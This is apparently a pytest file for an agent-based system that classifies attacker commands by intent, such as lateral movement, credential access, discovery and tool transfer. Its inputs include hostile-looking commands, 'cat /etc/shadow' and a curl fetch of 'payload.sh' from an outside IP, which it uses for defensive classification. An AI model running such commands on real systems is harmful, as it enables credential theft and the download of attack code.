from src.agents.main_agent import MainAgent
from src.agents.sub_agent import SubAgent


def _main() -> MainAgent:
    return object.__new__(MainAgent)


def test_ssh_lateral_movement_intent():
    intent = _main()._infer_intent("ssh admin@10.0.5.2", "ssh")
    assert intent["category"] == "lateral_movement"
    assert intent["target_ip"] == "10.0.5.2"
    assert intent["requires_subagent"] is True


def test_credential_access_intent():
    intent = _main()._infer_intent("cat /etc/shadow", "ssh")
    assert intent["category"] == "credential_access"


def test_discovery_intent():
    intent = _main()._infer_intent("whoami", "ssh")
    assert intent["category"] == "discovery"


def test_http_probe_does_not_require_subagent():
    intent = _main()._infer_intent("GET / HTTP/1.1", "tcp")
    assert intent["category"] == "web_probe"
    assert intent["requires_subagent"] is False


def test_subagent_extracts_tool_transfer():
    agent = object.__new__(SubAgent)
    intent = SubAgent._extract_intent(agent, "curl http://10.0.8.7/payload.sh")
    assert intent["category"] == "tool_transfer"
